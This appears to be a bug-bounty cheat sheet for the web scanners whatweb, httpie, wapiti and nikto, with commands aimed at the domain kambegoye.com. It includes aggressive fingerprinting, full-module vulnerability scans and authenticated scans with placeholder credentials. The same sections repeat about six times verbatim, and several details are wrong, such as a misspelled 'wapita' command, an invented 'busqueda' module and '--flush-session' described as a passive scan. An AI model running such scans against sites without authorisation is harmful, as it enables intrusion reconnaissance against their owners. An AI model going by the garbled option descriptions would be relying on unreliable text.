nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
